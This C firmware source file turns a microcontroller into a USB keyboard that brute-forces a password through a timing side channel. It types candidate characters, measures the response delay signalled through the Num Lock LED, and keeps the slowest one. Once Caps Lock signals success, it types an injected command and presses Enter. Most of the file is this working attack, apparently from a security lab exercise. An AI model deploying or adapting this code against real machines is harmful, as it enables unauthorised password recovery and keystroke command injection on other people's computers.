/* Header Files used: */
#include "KeyboardHID.h"
#include "Descriptors.h"
#include "authenticator_crack.h"
#include "timing.h"

/**
 *	This struct contains several state information of the hid with the
 *following initializations
 */
struct hid_state hid = {0, 0, 0, 0, 0, 0};

/**
 * Buffer to hold the previously generated HID report, for comparison purposes
 * inside the HID class driver.
 */
static uint8_t PrevHIDReportBuffer[KEYBOARD_REPORT_SIZE];

/** LUFA HID Class driver interface configuration and state information. This
 * structure is passed to all HID Class driver functions, so that multiple
 * instances of the same class within a device can be differentiated from one
 * another.
 */
USB_ClassInfo_HID_Device_t Generic_HID_Interface = {
    .Config =
        {
            .InterfaceNumber = INTERFACE_ID_KeyboardHID,
            .ReportINEndpoint =
                {
                    .Address = KEYBOARD_IN_EPADDR,
                    .Size = KEYBOARD_REPORT_SIZE,
                    .Banks = 1,
                },
            .PrevReportINBuffer = PrevHIDReportBuffer,
            .PrevReportINBufferSize = sizeof(PrevHIDReportBuffer),
        },
};

/**
 * Defines Buffer size for Keyboard reports
 */
uint8_t buffer[KEYBOARD_REPORT_SIZE];

/**
 *  USB runtime structure
 */
XMC_USBD_t USB_runtime = {.usbd = USB0,
                          .usbd_max_num_eps = XMC_USBD_MAX_NUM_EPS_6,
                          .usbd_transfer_mode = XMC_USBD_USE_FIFO,
                          .cb_xmc_device_event = USBD_SignalDeviceEventHandler,
                          .cb_endpoint_event =
                              USBD_SignalEndpointEvent_Handler};

/**
 * USB Interrupt handler
 */
void USB0_0_IRQHandler(void) { XMC_USBD_IRQHandler(&USB_runtime); }

/**
 * The function initializes the USB core layer and register call backs.
 */
void USB_Init(void)
{
  USBD_Initialize(&USB_runtime);

  /* Interrupts configuration*/
  NVIC_SetPriority(USB0_0_IRQn,
                   NVIC_EncodePriority(NVIC_GetPriorityGrouping(), 63, 0));
  NVIC_ClearPendingIRQ(USB0_0_IRQn);
  NVIC_EnableIRQ(USB0_0_IRQn);

  /* USB Connection*/
  USB_Attach();
}

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_(void) {}
/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void) {}

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Reset(void)
{
  if (device.IsConfigured)
  {
    USB_Init();
    device.IsConfigured = 0;
  }
}
unsigned int find_max_at_index(unsigned int, uint64_t *);
/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void)
{
  bool ConfigSuccess = true;

  USBD_SetEndpointBuffer(KEYBOARD_IN_EPADDR, buffer, KEYBOARD_REPORT_SIZE);

  ConfigSuccess &= HID_Device_ConfigureEndpoints(&Generic_HID_Interface);

  device.IsConfigured = ConfigSuccess;
}

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void)
{
  HID_Device_ProcessControlRequest(&Generic_HID_Interface);
}



unsigned int find_max_at_index(unsigned int size, uint64_t *ptr)
{
  uint64_t max = ptr[0];
  unsigned int max_count, location = 0;
  for (max_count = 1; max_count < size; max_count++)
  {
    if (ptr[max_count] > max)
    {
      max = ptr[max_count];
      location = max_count;
    }
  }
  return location;
}

unsigned int find_minimum(unsigned int size, uint64_t *ptr)
{
  uint64_t minimum = ptr[0];
  unsigned int min_count;
  for (min_count = 1; min_count < size; min_count++)
  {
    if (ptr[min_count] < minimum)
    {
      minimum = ptr[min_count];
    }
  }
  return minimum;
}
/** Callback function called when a new HID report needs to be created.
 *
 *  Params:
 *  HIDInterfaceInfo  Pointer to configuration structure being referenced
 *  ReportID    Report ID requested by the host if non-zero, otherwise callback
 * should set to the generated report ID ReportType  Type of the report to
 * create, either HID_REPORT_ITEM_In or HID_REPORT_ITEM_Feature ReportData
 * Pointer to a buffer where the created report should be stored ReportSize
 * Number of bytes written in the report (or zero default)
 *
 *  Returns: true to force the sending of the report, else to let the library
 * determine if it needs to be sent.
 */
bool CALLBACK_HID_Device_CreateHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, uint8_t *const ReportID,
    const uint8_t ReportType, void *ReportData, uint16_t *const ReportSize)
{
  USB_KeyboardReport_Data_t *KeyboardReport =
      (USB_KeyboardReport_Data_t *)ReportData;
  USB_KeyboardReport_Data_t *PrevReport =
      (USB_KeyboardReport_Data_t *)PrevHIDReportBuffer;
  uint8_t UsedKeyCodes = 0;
  uint8_t LastKeyCode;

  if (key.caps_lock == 1)
  {
    hid.actv = 0;
    hid.cracked = 1;
  }
  if (hid.cracked == 1)
  {
    if (key.caps_lock == 1)
    {
      KeyboardReport->KeyCode[UsedKeyCodes++] = HID_KEYBOARD_SC_CAPS_LOCK;
      key.caps_lock = 0;
      hid.n = 0;
    }
    else if (hid.hops == 0) // Indicate first phase
    {
      KeyboardReport->KeyCode[UsedKeyCodes++] = 0x00;
      hid.hops = 1;
    }
    else if (hid.hops == 1)
    { // create file to be delivered
      if (hid.n == 0)
      {
        hid.n++;
      }
      else if (hid.n > 0 && hid.n < inject_file.cnt)
      {
        KeyboardReport->KeyCode[UsedKeyCodes++] = inject_file.word[hid.n];
        if (inject_file.modifier[hid.n])
        {
          KeyboardReport->Modifier = inject_file.modifier[hid.n];
        }
        hid.n++;
      }
      else if (hid.n == inject_file.cnt)
      {
        KeyboardReport->KeyCode[UsedKeyCodes++] =
            inject_file.word[inject_file.cnt]; // Reads Command to be executed
                                               // in HID report buffer.
        if (inject_file.modifier[inject_file.cnt])
        {
          KeyboardReport->Modifier = inject_file.modifier[inject_file.cnt];
        }
        hid.hops = 2;
      }
    }
    else if (hid.hops == 2) // No Key Press.
    {
      KeyboardReport->KeyCode[UsedKeyCodes++] = 0x00;
      hid.hops = 3;
    }
    else if (hid.hops == 3)
    {
      KeyboardReport->KeyCode[UsedKeyCodes++] =
          GERMAN_KEYBOARD_SC_ENTER; // Add RETURN/ENTER after command.
      // Slight Delay.
      for (int i = 0; i < (1 << 15); i++)
        ;
      hid.cracked = 0;    // Reset cracked for next run.
      hid.check_char = 1; // Indicate no more attempts required.
      hid.actv = 0;       // Make HID inactive.
      hid.hops = 4;
    }
    else if (hid.hops == 4)
    {
      NVIC_SystemReset(); // Crack was successful. Reset system for next run.
    }
  }
  else if (hid.actv == 1)
  {
    if (key.num_lock == 1 && hid.check_char == 0)
    {
      if (!send_message_flag)
      {
        LastKeyCode = PrevReport->KeyCode[0]; // Store last sent character.
        if (LastKeyCode == psw.word[hid.n] && LastKeyCode != 0x00)
        {
          KeyboardReport->KeyCode[UsedKeyCodes++] =
              0x00; // To differentiate 2 similar key strokes.
        }
        else if (hid.n < psw.cnt)
        {
          KeyboardReport->KeyCode[UsedKeyCodes++] = psw.word[hid.n];
          if (psw.modifier[hid.n])
          {
            KeyboardReport->Modifier = psw.modifier[hid.n];
          }
          hid.n++;
        }
        else if (hid.n == psw.cnt)
        {
          /* This is the last character */
          KeyboardReport->KeyCode[UsedKeyCodes++] = psw.word[psw.cnt];
          if (psw.modifier[psw.cnt])
          {
            KeyboardReport->Modifier = psw.modifier[psw.cnt];
          }
          hid.n++;
          send_message_flag = true;
        }
      }
      if (!send_enter_flag && send_message_flag)
      {
        KeyboardReport->KeyCode[UsedKeyCodes++] =
            GERMAN_KEYBOARD_SC_ENTER; // Add Enter.
        hid.n = 0;
        send_enter_flag = true;
        request_sent_at_time = get_system_time();
        consume_on = true;
      }
    }
  }
  *ReportSize = sizeof(USB_KeyboardReport_Data_t);
  return true;
}

/** HID class driver callback function for the processing of HID reports from
 *the host.
 *
 *	Params:
 *  HIDInterfaceInfo  Pointer to the configuration structure being referenced
 *  ReportID    Report ID of the received report from the host
 *  ReportType  The type of report that the host has sent, either
 *HID_REPORT_ITEM_Out or HID_REPORT_ITEM_Feature ReportData  Pointer to a buffer
 *where the received report has been stored ReportSize  Size in bytes of the
 *received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(
    USB_ClassInfo_HID_Device_t *const HIDInterfaceInfo, const uint8_t ReportID,
    const uint8_t ReportType, const void *ReportData,
    const uint16_t ReportSize)
{
  uint8_t *LEDReport = (uint8_t *)ReportData;
  if (*LEDReport & HID_KEYBOARD_LED_NUMLOCK)
  {
    XMC_GPIO_SetOutputHigh(LED1);
    key.num_lock = 1;
    if (consume_on)
    {
      send_enter_flag = false;
      send_message_flag = false;
      if (response_counter >= 83)
      {
        response_counter = 0; // Roll Over.
        max_index = find_max_at_index(84, max_iteration_time);
        psw.word[psw.cnt] = pswchars.word[max_index];
        psw.modifier[psw.cnt] = pswchars.modifier[max_index];
        psw.cnt++;
        pswchars.cnt = 0;
        psw.word[psw.cnt] = pswchars.word[pswchars.cnt];
        psw.modifier[psw.cnt] = pswchars.modifier[pswchars.cnt];
        memset(max_iteration_time, 0,
               84 * sizeof(uint64_t)); // Refresh old data.
      }
      else
      {
        if (pswchars.cnt >= 83)
        {
          pswchars.cnt = 0;
        }
        else
        {
          pswchars.cnt++;
        }
        psw.word[psw.cnt] = pswchars.word[pswchars.cnt];
        psw.modifier[psw.cnt] = pswchars.modifier[pswchars.cnt];
        max_iteration_time[response_counter] =
            get_system_time() - request_sent_at_time;
        response_counter++;
      }
      consume_on = false;
    }
  }
  else
  {
    XMC_GPIO_SetOutputLow(LED1);
    key.num_lock = 0;
  }

  if (*LEDReport & HID_KEYBOARD_LED_CAPSLOCK)
  {
    XMC_GPIO_SetOutputHigh(LED2);
    key.caps_lock = 1;
  }
  else
  {
    XMC_GPIO_SetOutputLow(LED2);
    key.caps_lock = 0;
  }
}

bool CALLBACK_HIDParser_FilterHIDReportItem(
    HID_ReportItem_t *const CurrentItem)
{
  return true;
}